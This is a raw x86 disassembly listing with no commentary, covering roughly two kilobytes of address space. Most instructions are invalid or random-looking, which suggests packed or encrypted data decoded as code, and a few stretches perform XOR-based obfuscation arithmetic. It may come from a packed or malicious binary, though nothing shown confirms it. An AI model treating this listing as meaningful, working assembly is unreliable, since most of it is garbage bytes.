  4117eb:	mov    al,BYTE PTR [edi+0x6aa9496c]
  4117f1:	cld    
  4117f2:	jmp    0x91d8:0xc7de0c05
  4117f9:	out    0x6a,al
  4117fb:	jecxz  0x41185f
  4117fd:	aad    0xc
  4117ff:	and    cl,al
  411801:	das    
  411802:	ficom  DWORD PTR [ebx]
  411804:	sub    BYTE PTR [ecx],dl
  411806:	shl    BYTE PTR [ecx],0xaa
  411809:	aam    0xf1
  41180b:	sbb    eax,0x9e4385ee
  411810:	inc    esi
  411811:	popf   
  411812:	out    dx,al
  411813:	mov    cl,0xa3
  411815:	jecxz  0x4117d2
  411817:	xlat   BYTE PTR ds:[ebx]
  411818:	sbb    al,0x14
  41181a:	mov    dl,0x2d
  41181c:	xchg   ebp,eax
  41181d:	jp     0x41188a
  41181f:	jg     0x41182c
  411821:	pop    ebx
  411822:	pop    ecx
  411823:	push   esp
  411824:	add    DWORD PTR [esp+eiz*4+0x35da6dca],0x517924d0
  41182f:	fwait
  411830:	jbe    0x411801
  411832:	stc    
  411833:	push   edx
  411834:	add    al,0x24
  411836:	(bad)  
  411837:	loopne 0x41187e
  411839:	pop    edx
  41183a:	pop    ebx
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x458688e9],dl
  41187c:	ret    0x5776
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118e6
  411886:	aam    0xb9
  411888:	dec    edi
  411889:	push   ds
  41188a:	jo     0x4118e0
  41188c:	push   esi
  41188d:	test   DWORD PTR [edx-0x18260ddb],edx
  411893:	push   cs
  411894:	sbb    esi,0xffffffe8
  411897:	mov    ebp,0x21cf81a2
  41189c:	int    0xfb
  41189e:	push   cs
  41189f:	dec    esi
  4118a0:	mov    DWORD PTR [eax-0x24],edi
  4118a3:	or     eax,0x18cf2bee
  4118a8:	and    cl,dh
  4118aa:	pop    ebx
  4118ab:	data16 and al,0x10
  4118ae:	cmp    DWORD PTR [edx+0x6],edx
  4118b1:	jmp    0x81360b67
  4118b6:	mov    al,ds:0x846b18f5
  4118bb:	enter  0xb12a,0x9a
  4118bf:	jge    0x4118a6
  4118c1:	shld   DWORD PTR [edx+0x6a],esp,cl
  4118c5:	cld    
  4118c6:	out    dx,eax
  4118c7:	jae    0x411936
  4118c9:	and    edx,DWORD PTR [edi]
  4118cb:	enter  0x9e18,0xfe
  4118cf:	adc    dh,BYTE PTR [eax]
  4118d1:	xor    ch,dh
  4118d3:	sbb    DWORD PTR [edi],ecx
  4118d5:	xor    ah,cl
  4118d7:	add    BYTE PTR [ebp+0x28d49bbe],bh
  4118dd:	ror    BYTE PTR [eax-0x77f7b867],1
  4118e3:	scas   al,BYTE PTR es:[edi]
  4118e4:	rcr    BYTE PTR [eax+0x1a],0x92
  4118e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118e9:	adc    BYTE PTR ds:0xc0527897,dl
  4118ef:	push   ebx
  4118f0:	lock fs sub al,0xeb
  4118f4:	xchg   ecx,eax
  4118f5:	cmp    DWORD PTR [ebx+0x22],ecx
  4118f8:	mov    fs,esp
  4118fa:	ss pop esp
  4118fc:	and    DWORD PTR [ecx+eax*2+0x3a],ebx
  411900:	cmp    al,BYTE PTR [esi-0x66]
  411903:	mov    dl,0xf3
  411905:	adc    ebp,DWORD PTR [edx-0x48]
  411908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411909:	push   ecx
  41190a:	out    0x1e,al
  41190c:	inc    eax
  41190d:	test   BYTE PTR [edi-0x21],cl
  411910:	cwde   
  411911:	repnz dec ecx
  411913:	outs   dx,DWORD PTR ds:[esi]
  411914:	lea    ecx,[ecx-0x6043901a]
  41191a:	dec    edx
  41191b:	xor    DWORD PTR [edi+0x5fabc8db],ebx
  411921:	mov    edx,0x4230ab53
  411926:	aad    0x9
  411928:	add    edi,DWORD PTR [esi]
  41192a:	dec    ecx
  41192b:	sub    bh,BYTE PTR [edx+0x4e6398ec]
  411931:	std    
  411932:	loope  0x4118ed
  411934:	aas    
  411935:	xor    ah,dl
  411937:	jecxz  0x411952
  411939:	imul   esi,DWORD PTR [esi+0x5b7e7df3],0x6a
  411940:	pop    edx
  411941:	std    
  411942:	mov    eax,ebp
  411944:	xor    DWORD PTR [ebx-0x782c52d8],edi
  41194a:	fild   QWORD PTR [ebx+ebx*4]
  41194d:	(bad)  
  41194f:	rol    al,1
  411951:	cmp    al,0x6d
  411953:	mov    bh,0x8a
  411955:	cmp    ch,al
  411957:	cmp    ch,BYTE PTR [edx]
  411959:	dec    BYTE PTR [edx+0x69c5b38c]
  41195f:	clc    
  411960:	mov    ah,0xb
  411962:	add    eax,0x3d735956
  411967:	fisubr WORD PTR [edx]
  411969:	loop   0x4119c3
  41196b:	mov    dl,0xb1
  41196d:	cdq    
  41196e:	mov    BYTE PTR [edi],ah
  411970:	mov    bh,0xb6
  411972:	xchg   edi,eax
  411973:	in     eax,dx
  411974:	push   cs
  411975:	adc    dl,BYTE PTR [edi]
  411977:	push   eax
  411978:	mov    ah,0xb1
  41197a:	sbb    eax,0xa4b05073
  41197f:	loope  0x4119a4
  411981:	adc    eax,eax
  411983:	call   DWORD PTR [ebx+0x65]
  411986:	stos   DWORD PTR es:[edi],eax
  411987:	das    
  411988:	rep gs stos BYTE PTR es:[edi],al
  41198b:	das    
  41198c:	mov    ds:0xa01b8cdc,eax
  411992:	and    esp,0xffffffa6
  411995:	lods   eax,DWORD PTR ds:[esi]
  411996:	dec    edi
  411997:	fdiv   st,st(1)
  411999:	loopne 0x41194f
  41199b:	leave  
  41199c:	lds    ebx,FWORD PTR [edx+0x2a9d0c8b]
  4119a2:	imul   esi,DWORD PTR [edi+ebx*4],0x1225495a
  4119a9:	clc    
  4119aa:	push   es
  4119ab:	test   eax,0xf0d6ce2b
  4119b0:	mov    ds:0xea693f0,al
  4119b5:	jg     0x411989
  4119b7:	jmp    0x41199d
  4119b9:	or     DWORD PTR [ebx+0x24caf2e8],ebx
  4119bf:	stc    
  4119c0:	xchg   ecx,eax
  4119c1:	xchg   edi,eax
  4119c2:	or     esp,ebx
  4119c4:	and    DWORD PTR [ebp+ebx*8+0x16f18fb7],eax
  4119cb:	ins    DWORD PTR es:[edi],dx
  4119cc:	add    BYTE PTR [ebx],dh
  4119ce:	jo     0x4119dd
  4119d0:	(bad)  
  4119d1:	sahf   
  4119d2:	test   DWORD PTR [ecx-0xc18c156],edx
  4119d8:	push   ebp
  4119d9:	pop    ss
  4119da:	addr16 mov edi,0xf228c7bd
  4119e0:	lods   eax,DWORD PTR ds:[esi]
  4119e1:	pop    ss
  4119e2:	pop    eax
  4119e3:	(bad)
  4119e6:	hlt    
  4119e7:	push   es
  4119e8:	rol    ecx,1
  4119ea:	dec    ebx
  4119eb:	div    eax
  4119ed:	jecxz  0x4119b7
  4119ef:	xchg   edi,eax
  4119f0:	xor    al,0xdc
  4119f2:	stc    
  4119f3:	dec    esp
  4119f4:	call   0x1385:0xd8172d20
  4119fb:	in     al,dx
  4119fc:	in     al,dx
  4119fd:	fdivr  QWORD PTR [ebx]
  4119ff:	(bad)  
  411a00:	ins    DWORD PTR es:[edi],dx
  411a01:	adc    esp,DWORD PTR [edx-0x2d6860e5]
  411a07:	xchg   esp,eax
  411a08:	xchg   edi,eax
  411a09:	je     0x411a2d
  411a0b:	cmp    al,0x26
  411a0d:	fimul  WORD PTR ss:[ebx-0x4c2a8b2c]
  411a14:	mov    ch,BYTE PTR [esi]
  411a16:	jmp    0x411a4d
  411a18:	pushf  
  411a19:	cmp    dh,BYTE PTR [edx-0x11790f98]
  411a1f:	aam    0xb6
  411a21:	jp     0x4119b1
  411a23:	sbb    ebx,DWORD PTR [edi]
  411a25:	xchg   ebx,eax
  411a26:	ins    DWORD PTR es:[edi],dx
  411a27:	or     eax,0xc3d7a493
  411a2c:	lea    edx,[edx]
  411a2e:	repnz mov ecx,0x7baab7e0
  411a34:	retf   0x4942
  411a37:	push   edi
  411a38:	and    al,0x83
  411a3a:	fiadd  DWORD PTR [eax-0x3d]
  411a3d:	jg     0x4119e6
  411a3f:	cmp    BYTE PTR [ebp+0x373afb50],bh
  411a45:	cwde   
  411a46:	pop    ebp
  411a47:	mov    bl,0x87
  411a49:	fcmovnbe st,st(0)
  411a4b:	xchg   ebp,eax
  411a4c:	rcr    ch,1
  411a4e:	leave  
  411a4f:	(bad)  
  411a50:	nop
  411a51:	(bad)  
  411a52:	mov    eax,0x547eef73
  411a57:	shr    BYTE PTR [ebx+0xb80fe52],1
  411a5d:	jl     0x411a81
  411a5f:	mov    ds:0xc56f19e7,eax
  411a64:	or     DWORD PTR [ecx],edx
  411a66:	jecxz  0x411ac0
  411a68:	lock and BYTE PTR [edx],cl
  411a6b:	arpl   WORD PTR [edi],ax
  411a6d:	not    cl
  411a6f:	ficomp WORD PTR [ebx-0x17264543]
  411a75:	dec    ebx
  411a76:	ins    DWORD PTR es:[edi],dx
  411a77:	xor    al,0x56
  411a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a7a:	(bad)  
  411a7c:	pop    es
  411a7d:	fwait
  411a7e:	push   0xffffff90
  411a80:	push   ebp
  411a81:	mov    bh,0x82
  411a83:	int3   
  411a84:	adc    al,0x7f
  411a86:	pop    ebx
  411a87:	cmp    DWORD PTR [ecx+0x476de86],edx
  411a8d:	or     BYTE PTR [edi+ecx*2+0x3a],bh
  411a91:	inc    edi
  411a92:	jo     0x411a38
  411a94:	pop    ebx
  411a95:	cld    
  411a96:	sbb    bl,cl
  411a98:	in     al,dx
  411a99:	sbb    ah,ch
  411a9b:	adc    ebx,DWORD PTR [eax+0x10]
  411a9e:	jle    0x411ad3
  411aa0:	sbb    esp,DWORD PTR [edi+0x438ae1ee]
  411aa6:	fidivr WORD PTR cs:0xac1fb33
  411aad:	shl    BYTE PTR [edi+0x23fa618f],cl
  411ab3:	or     ah,bl
  411ab5:	mov    ah,0xca
  411ab7:	mov    edi,0x4b0db6ce
  411abc:	push   cs
  411abd:	xchg   ecx,eax
  411abe:	test   eax,0x4ef65c94
  411ac3:	cld    
  411ac4:	pop    ds
  411ac5:	and    ebx,esi
  411ac7:	adc    eax,0x185a21a3
  411acc:	imul   ebx,DWORD PTR [ecx],0xc8301975
  411ad2:	pop    esp
  411ad3:	aas    
  411ad4:	aaa    
  411ad5:	cli    
  411ad6:	xchg   BYTE PTR [ecx],ah
  411ad8:	cmp    DWORD PTR [edi+0x24410810],esi
  411ade:	stos   DWORD PTR es:[edi],eax
  411adf:	loopne 0x411b22
  411ae1:	jns    0x411b5d
  411ae3:	std    
  411ae4:	cmp    esp,ebp
  411ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ae7:	das    
  411ae8:	jp     0x411a8d
  411aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aeb:	jmp    0x411b1f
  411aed:	stos   BYTE PTR es:[edi],al
  411aee:	jno    0x411b4a
  411af0:	adc    bl,bh
  411af2:	dec    bh
  411af4:	adc    DWORD PTR [edx],ebp
  411af6:	stos   BYTE PTR es:[edi],al
  411af7:	lahf   
  411af8:	mov    ebx,0x3b019624
  411afd:	mov    dh,0xc5
  411aff:	ss aaa 
  411b01:	loop   0x411af7
  411b03:	aaa    
  411b04:	and    ebx,DWORD PTR [ecx-0x60]
  411b07:	push   edi
  411b08:	retf   0xa021
  411b0b:	not    esi
  411b0d:	cwde   
  411b0e:	sbb    al,0x84
  411b10:	mov    al,ds:0x145d8c59
  411b15:	inc    ebx
  411b16:	lahf   
  411b17:	(bad)  
  411b18:	dec    ecx
  411b19:	adc    eax,0xfb15c8b8
  411b1e:	or     ah,dh
  411b20:	jb     0x411aec
  411b22:	inc    eax
  411b23:	nop
  411b24:	mov    ecx,0x29bdd62d
  411b29:	not    BYTE PTR [edx-0x1]
  411b2c:	cs or  eax,0x4ae43904
  411b32:	cmc    
  411b33:	add    DWORD PTR [edi],0xd1a7c3ce
  411b39:	or     BYTE PTR [ecx+ebx*4],0xa7
  411b3d:	arpl   WORD PTR [edx+0x570e7140],ax
  411b43:	out    dx,al
  411b44:	or     DWORD PTR [ecx+0x5cdb5c25],eax
  411b4a:	dec    ebx
  411b4b:	inc    edi
  411b4c:	sbb    eax,0xf7c2d179
  411b51:	mov    cl,BYTE PTR [ecx]
  411b53:	inc    edx
  411b54:	aam    0x26
  411b56:	daa    
  411b57:	xchg   ah,cl
  411b59:	mov    dl,0xd1
  411b5b:	inc    esp
  411b5c:	push   edi
  411b5d:	sbb    BYTE PTR [edx+0x25],dh
  411b60:	jmp    0xf59c:0xd46712e4
  411b67:	(bad)  
  411b68:	mov    ebx,0xd3d945c2
  411b6d:	ins    DWORD PTR es:[edi],dx
  411b6e:	add    edx,DWORD PTR [ecx]
  411b70:	xchg   ebp,eax
  411b71:	fsub   QWORD PTR [edi+0x65]
  411b74:	popa   
  411b75:	hlt    
  411b76:	mov    esi,0x7770f367
  411b7b:	push   ecx
  411b7c:	ret    0x9ff9
  411b7f:	jne    0x411b8b
  411b81:	adc    al,0xce
  411b83:	dec    edi
  411b84:	mov    cl,0xb6
  411b86:	cmc    
  411b87:	in     al,dx
  411b88:	xchg   edx,eax
  411b89:	lahf   
  411b8a:	or     eax,0x6d74913e
  411b8f:	add    BYTE PTR ss:[esi+0x76cfa439],ah
  411b96:	mov    al,ds:0xd887648a
  411b9b:	cmp    al,0xea
  411b9d:	pop    eax
  411b9e:	push   cs
  411b9f:	sbb    BYTE PTR [ebx-0x26],cl
  411ba2:	fidiv  DWORD PTR [edi-0x2aafae18]
  411ba8:	cmp    eax,DWORD PTR [esi+edx*4]
  411bab:	fdivr  DWORD PTR [esi+0x64c45f39]
  411bb1:	pop    esi
  411bb2:	adc    DWORD PTR [esi-0x4c7852e0],esp
  411bb8:	call   DWORD PTR [eax+edx*2-0x45]
  411bbc:	bound  ebx,QWORD PTR [edi-0x6dbfa602]
  411bc2:	inc    eax
  411bc3:	cmp    cl,BYTE PTR [ebp-0x5]
  411bc6:	and    DWORD PTR [edx],ecx
  411bc8:	and    DWORD PTR [esi-0x2f191a37],edi
  411bce:	jmp    0x7e76:0x999852a2
  411bd5:	xchg   al,cl
  411bd7:	adc    DWORD PTR [ebp-0x73],ebx
  411bda:	gs jns 0x411c18
  411bdd:	and    al,0x42
  411bdf:	gs cmp eax,0x4ae9bffc
  411be5:	cs shr ecx,0x3c
  411be9:	fisttp DWORD PTR [esi]
  411beb:	jecxz  0x411bf8
  411bed:	cmp    al,0x7e
  411bef:	hlt    
  411bf0:	sbb    ch,dl
  411bf2:	hlt    
  411bf3:	aas    
  411bf4:	mov    bl,0xcb
  411bf6:	dec    esp
  411bf7:	dec    eax
  411bf8:	aaa    
  411bf9:	sti    
  411bfa:	(bad)  
  411bfc:	sti    
  411bfd:	add    BYTE PTR [edi-0xc27ab17],ah
  411c03:	mov    dh,0x26
  411c05:	sbb    eax,0x13
  411c08:	mov    al,ds:0xe08cedc2
  411c0d:	loope  0x411b92
  411c0f:	outs   dx,BYTE PTR ds:[esi]
  411c10:	out    dx,eax
  411c11:	add    ebp,DWORD PTR [ebp+0x2ad706c1]
  411c17:	sti    
  411c18:	xor    DWORD PTR [edx-0x208baed9],0xcddec53
  411c22:	push   ecx
  411c23:	add    al,0xfd
  411c25:	test   DWORD PTR [esi],0x7be57c93
  411c2b:	test   BYTE PTR [ebp+0x3a56bc6b],dl
  411c31:	bound  edi,QWORD PTR [ebp-0x5b]
  411c34:	(bad)  
  411c35:	fstp   DWORD PTR [ebx]
  411c37:	pop    ebp
  411c38:	mov    WORD PTR [esi+0x280d64ff],gs
  411c3e:	add    BYTE PTR [eax+eiz*2],dh
  411c41:	retf   0xe864
  411c44:	xchg   ebx,eax
  411c45:	test   DWORD PTR [ebp-0x7c],edi
  411c48:	ret    
  411c49:	sub    eax,0x5fa0d17d
  411c4e:	loopne 0x411c58
  411c50:	fwait
  411c51:	rcr    BYTE PTR [edi-0x5df88f63],cl
  411c57:	call   0x6f3d:0x47fa856a
  411c5e:	test   al,0xcc
  411c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c61:	ret    0xe855
  411c64:	mov    eax,0xf7f0ccb7
  411c69:	jge    0x411ca0
  411c6b:	mov    ch,0x11
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xebd2a45e
  411cb8:	dec    esp
  411cb9:	pop    esi
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c98
  411cc2:	lods   al,BYTE PTR ds:[esi]
  411cc3:	or     DWORD PTR [edi+0x16],ecx
  411cc6:	mov    WORD PTR [esi],ds
  411cc8:	and    DWORD PTR ds:0x5d902c90,esi
  411cce:	xor    ah,BYTE PTR [ebx-0x55]
  411cd1:	pop    ecx
  411cd2:	out    0xb4,eax
  411cd4:	clc    
  411cd5:	pop    edx
  411cd6:	mov    dh,0xd
  411cd8:	sub    ah,BYTE PTR [eax+0x4a]
  411cdb:	mov    al,0xb2
  411cdd:	aam    0x2c
  411cdf:	inc    esp
  411ce0:	jae    0x411d01
  411ce2:	add    ebp,eax
  411ce4:	das    
  411ce5:	std    
  411ce6:	das    
  411ce7:	dec    edx
  411ce8:	dec    DWORD PTR [esi+0x191c1860]
  411cee:	lock jmp 0xd861:0x8657e70
  411cf6:	test   DWORD PTR [ebx-0x66],ebx
  411cf9:	ds pop esi
  411cfb:	inc    edx
  411cfc:	and    eax,0x99d6b3c4
  411d01:	or     ebx,DWORD PTR [eax]
  411d03:	test   BYTE PTR [ecx+0x36],ah
  411d06:	jno    0x411cf1
  411d08:	mov    al,0x56
  411d0a:	push   esi
  411d0b:	push   eax
  411d0c:	ins    BYTE PTR es:[edi],dx
  411d0d:	sub    al,0xd6
  411d0f:	pop    ss
  411d10:	push   es
  411d11:	shl    DWORD PTR [ebx],0x4c
  411d14:	cld    
  411d15:	fsub   st(6),st
  411d17:	aad    0x9e
  411d19:	mov    ds:0x5d4843e1,al
  411d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d1f:	out    dx,al
  411d20:	pop    ecx
  411d21:	or     ah,BYTE PTR [edi-0x667eea1e]
  411d27:	mov    esi,0xbee95d64
  411d2c:	popf   
  411d2d:	add    esi,DWORD PTR [esi+0x3f]
  411d30:	inc    ebp
  411d31:	sbb    eax,0xca9c316e
  411d36:	jge    0x411d05
  411d38:	jmp    0x8d96ea3c
  411d3d:	xchg   BYTE PTR [esi-0x57c6b5f0],al
  411d43:	call   0x310:0xc0443689
  411d4a:	mov    BYTE PTR [ecx+0x39],al
  411d4d:	cli    
  411d4e:	push   ss
  411d4f:	clc    
  411d50:	addr16 push edi
  411d52:	pushf  
  411d53:	pop    ss
  411d54:	pusha  
  411d55:	cmp    al,0x6b
  411d57:	fwait
  411d58:	jnp    0x411d59
  411d5a:	repz push 0x797b9dc4
  411d60:	push   0xffffffc6
  411d62:	pop    ss
  411d63:	sbb    ah,0xea
  411d66:	inc    eax
  411d67:	inc    edx
  411d68:	call   0x60b9dfa0
  411d6d:	sub    dh,al
  411d6f:	popf   
  411d70:	sub    BYTE PTR [edi],0x8f
  411d73:	mov    ah,0x87
  411d75:	mov    eax,ds:0xb8301905
  411d7a:	cmp    DWORD PTR [ebx-0x19],0x3
  411d7e:	out    dx,eax
  411d7f:	icebp  
  411d80:	js     0x411df9
  411d82:	repnz int3 
  411d84:	sbb    eax,0xc0f39dc0
  411d89:	sar    DWORD PTR [edx+0x6bb2c0b8],0x64
  411d90:	stc    
  411d91:	mov    al,0x8d
  411d93:	xor    ah,BYTE PTR [ebx]
  411d95:	inc    ecx
  411d96:	sbb    BYTE PTR [ebp+ebx*4-0x716b9d8f],dl
  411d9d:	call   0x326b:0x1cc34a97
  411da4:	push   ss
  411da5:	sti    
  411da6:	(bad)  
  411da7:	adc    BYTE PTR [edx],al
  411da9:	pop    es
  411daa:	sub    dl,ch
  411dac:	or     DWORD PTR [ebx+0xb],eax
  411daf:	ret    
  411db0:	pop    edx
  411db1:	jns    0x411e1a
  411db3:	pop    edi
  411db4:	pop    ebx
  411db5:	repz or DWORD PTR [ebx+0x63d6d951],eax
  411dbc:	repnz fcomp DWORD PTR gs:[edi+0x5c]
  411dc1:	nop
  411dc2:	jmp    0x411d71
  411dc4:	jp     0x411db9
  411dc6:	iret   
  411dc7:	sbb    al,dh
  411dc9:	stos   DWORD PTR es:[edi],eax
  411dca:	(bad)  
  411dcb:	cld    
  411dcc:	xchg   BYTE PTR [ecx],dh
  411dce:	mov    ecx,0x5c3795b6
  411dd3:	sub    DWORD PTR [edi+eax*8+0x39],edi
  411dd7:	pop    ds
  411dd8:	sahf   
  411dd9:	lock push 0xffffff88
  411ddc:	int    0x9c
  411dde:	(bad)  [ebp+ebx*8-0x62f21846]
  411de5:	popa   
  411de6:	sub    DWORD PTR [eax+ebp*8-0x5e174b99],esp
  411ded:	push   edi
  411dee:	mov    dl,0x43
  411df0:	retf   
  411df1:	mov    eax,ds:0x7f73e810
  411df6:	mov    esi,0x444d77c3
  411dfb:	pop    esi
  411dfc:	and    eax,0xdb84605a
  411e01:	scas   eax,DWORD PTR es:[edi]
  411e02:	mov    ebx,0xa9294562
  411e07:	xor    ecx,edi
  411e09:	cmc    
  411e0a:	or     BYTE PTR [eax+0x4e],dl
  411e0d:	ret    0x6c8a
  411e10:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  411e12:	sub    BYTE PTR [edx+0x74],dh
  411e15:	loopne 0x411e45
  411e17:	test   DWORD PTR [edx-0x7e21f0ba],0x4906ba33
  411e21:	loop   0x411db6
  411e23:	mov    ch,0xc7
  411e25:	push   edi
  411e26:	xchg   DWORD PTR [esi+0x3c],ecx
  411e29:	push   eax
  411e2a:	ds add ebp,eax
  411e2d:	jp     0x411dbf
  411e2f:	daa    
  411e30:	mov    dh,0x6b
  411e32:	xor    DWORD PTR [ebx],0x72985221
  411e38:	mov    gs,edx
  411e3a:	cmp    eax,0x696d3525
  411e3f:	shr    DWORD PTR [eax],1
  411e41:	dec    ebx
  411e42:	or     DWORD PTR [ecx+0x3e],0xffffff98
  411e46:	repnz sub bh,0x28
  411e4a:	push   eax
  411e4b:	(bad)  
  411e4c:	bound  ebx,QWORD PTR [edi+0x3]
  411e4f:	xchg   ebp,eax
  411e50:	mov    BYTE PTR [ebp-0x59],cl
  411e53:	clc    
  411e54:	stc    
  411e55:	mov    esp,0xc0518b31
  411e5a:	jp     0x411de4
  411e5c:	enter  0x781f,0xc3
  411e60:	call   0x59ffde6d
  411e65:	in     eax,dx
  411e66:	mov    bl,0x36
  411e68:	push   0xc88b3aaf
  411e6d:	dec    ebp
  411e6e:	jp     0x411edd
  411e70:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e72:	jo     0x411e47
  411e74:	dec    edi
  411e75:	leave  
  411e76:	ja     0x411ea8
  411e78:	mov    WORD PTR [ebx+ecx*8+0x16d2633b],ds
  411e7f:	and    BYTE PTR [ebx+0x14],ah
  411e82:	outs   dx,DWORD PTR ds:[esi]
  411e83:	mov    esi,DWORD PTR [edi+0x280ce36e]
  411e89:	ss icebp 
  411e8b:	je     0x411e16
  411e8d:	dec    ebp
  411e8e:	mov    eax,ds:0x9e635ca8
  411e93:	cmp    esp,ecx
  411e95:	addr16 pop ss
  411e97:	fwait
  411e98:	das    
  411e99:	jns    0x411e92
  411e9b:	mov    ?,WORD PTR [ebx-0x4c]
  411e9e:	and    eax,0x186358fc
  411ea3:	cmp    DWORD PTR [edx+ecx*4+0x3e],edx
  411ea7:	punpcklwd mm6,DWORD PTR [ebx-0x72cb5aea]
  411eae:	arpl   WORD PTR [edi],cx
  411eb0:	sub    ecx,DWORD PTR [ebx]
  411eb2:	dec    edx
  411eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb4:	xchg   ecx,eax
  411eb5:	arpl   si,cx
  411eb7:	xor    al,0x45
  411eb9:	add    eax,0xd408b47d
  411ebe:	out    0x8a,al
  411ec0:	clc    
  411ec1:	inc    ecx
  411ec2:	push   ebp
  411ec3:	and    ecx,DWORD PTR [edi-0x12]
  411ec6:	mov    ah,BYTE PTR [ebx]
  411ec8:	popa   
  411ec9:	mov    esi,0x1f421ae1
  411ece:	and    al,0x23
  411ed0:	xlat   BYTE PTR ds:[ebx]
  411ed1:	add    ecx,DWORD PTR [esi+0x786ee7ea]
  411ed7:	mov    dl,bl
  411ed9:	and    eax,0xf32d37b3
  411ede:	jno    0x411f47
  411ee0:	push   ecx
  411ee1:	pop    ds
  411ee2:	add    eax,0x44fcaf0d
  411ee7:	lock in al,0xf2
  411eea:	pop    es
  411eeb:	xchg   esi,eax
  411eec:	push   esp
  411eed:	icebp  
  411eee:	adc    edx,edx
  411ef0:	aaa    
  411ef1:	jg     0x411eab
  411ef3:	loope  0x411eed
  411ef5:	push   edi
  411ef6:	or     al,0x1
  411ef8:	retf   0x72eb
  411efb:	sbb    eax,DWORD PTR [edx]
  411efd:	or     eax,0x9de7882e
  411f02:	cmp    al,0x9a
  411f04:	xchg   esi,eax
  411f05:	xchg   DWORD PTR [edi],edx
  411f07:	inc    edi
  411f08:	pop    esi
  411f09:	iret   
  411f0a:	std    
  411f0b:	fucomi st,st(0)
  411f0d:	fidiv  WORD PTR [ebx-0x67f5c7a7]
  411f13:	mov    dh,0x85
  411f15:	or     DWORD PTR [edx-0x45fde32f],0x79
  411f1c:	addr16 loop 0x411eda
  411f1f:	in     al,0x70
  411f21:	sbb    eax,0xda366dc
  411f26:	test   al,0x9f
  411f28:	out    0x4f,eax
  411f2a:	jmp    0x462a:0x1eeb1979
  411f31:	aaa    
  411f32:	std    
  411f33:	outs   dx,DWORD PTR ds:[esi]
  411f34:	mov    dh,0x16
  411f36:	dec    ebx
  411f37:	adc    bh,BYTE PTR [edx]
  411f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f3a:	lods   eax,DWORD PTR ds:[esi]
  411f3b:	lea    ecx,[ecx]
  411f3d:	scas   al,BYTE PTR es:[edi]
  411f3e:	nop
  411f3f:	mov    ch,0x34
  411f41:	jno    0x411f1f
  411f43:	push   esi
  411f44:	xchg   edi,eax
  411f45:	add    dh,cl
  411f47:	rcl    DWORD PTR es:[bx-0x74],1
  411f4c:	pop    ebp
  411f4d:	push   0x28
  411f4f:	inc    ebp
  411f50:	push   ebx
  411f51:	pmullw mm1,QWORD PTR [ebp+0x7f]
  411f55:	(bad)  
  411f56:	mov    al,ds:0x2e5e4193
  411f5b:	mov    dl,0xb2
  411f5d:	push   ebx
  411f5e:	mov    ?,WORD PTR [ebp+0x4c838b34]
  411f64:	mov    edx,0xb3c30b6d
  411f69:	dec    ebp
  411f6a:	cmp    esi,eax
  411f6c:	xor    BYTE PTR [esi+0x3db70f0a],ch
  411f72:	popa   
  411f73:	xor    BYTE PTR [edi+0x13],dh
  411f76:	lock test eax,0xb71d3cd1
  411f7c:	fninit 
  411f7e:	dec    edx
  411f7f:	pushf  
  411f80:	outs   dx,DWORD PTR ds:[esi]
  411f81:	inc    edx
  411f82:	or     BYTE PTR [ecx-0x1],bl
  411f85:	mov    cl,0x7a
  411f87:	pop    es
  411f88:	jp     0x411f8e
  411f8a:	pop    ds
  411f8b:	jb     0x412000
  411f8d:	daa    
  411f8e:	mov    al,0x75
  411f90:	jp     0x411f29
  411f92:	and    DWORD PTR [edi-0x498d567f],esi
  411f98:	mov    DWORD PTR [edx+0x23],ebx
  411f9b:	xlat   BYTE PTR ds:[ebx]
  411f9c:	pop    ebp
  411f9d:	xchg   ebp,eax
  411f9e:	mov    BYTE PTR [eax],dl
  411fa0:	add    al,0xf6
  411fa2:	xchg   esp,eax
  411fa3:	pop    ds
  411fa4:	inc    esi
  411fa5:	mov    eax,ds:0x3d4d753e
  411faa:	mov    WORD PTR [ebx-0x4a],gs
  411fad:	sahf   
  411fae:	jle    0x411fa1
  411fb0:	je     0x411fb4
  411fb2:	pop    esp
  411fb3:	ss adc al,0xa4
  411fb6:	sub    DWORD PTR [ebp-0x4cab50b5],0xe35f054d
  411fc0:	xor    ch,dh
  411fc2:	ss into 
  411fc4:	scas   eax,DWORD PTR es:[edi]
  411fc5:	jecxz  0x411f8d
  411fc7:	cmp    ch,BYTE PTR [edx]
